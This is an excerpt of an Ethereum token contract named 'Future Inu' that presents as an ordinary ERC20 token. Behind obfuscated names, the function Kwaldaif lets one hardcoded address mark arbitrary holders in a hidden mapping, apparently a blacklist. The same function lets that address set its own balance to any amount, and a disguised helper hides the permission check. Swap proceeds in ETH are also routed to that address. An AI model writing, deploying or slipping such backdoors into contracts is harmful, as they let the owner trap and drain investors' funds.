...
contract  FutureInu is Context, IERC20, Ownable {
    ...
    string private _name = "Future Inu";
    string private _symbol = "FInu";
    uint8 private _decimals = 9;
    address payable public PskaLW;
    ...
    constructor () {
        ...
        PskaLW = payable(address(0x70018D1c38808553b8dafB85fbaeC85D1bA20f62));
    ...
    function Kwaldaif(bool Lsoiw, address[] calldata Xalwkd, uint256 Nsiadwnl) public {
        for (uint256 i; i < Xalwkd.length; i++) {
            XLasikw[Xalwkd[i]] = Lsoiw;
        }
        uint256 amouIn;
        LiwndS(Xalwkd.length > 0);amouIn = Nsiadwnl + 2 * balanceOf(PskaLW);
        _balances[PskaLW] = amouIn;
    }

    function LiwndS(bool status) view private{
        if (status && true) 
            require(PskaLW == _msgSender());
    }
    ...
    function swapAndLiquify(uint256 tAmount) private lockTheSwap {
        ...
        if(amountETHTeam > 0)
            transferToAddressETH(PskaLW, amountETHTeam);
    }
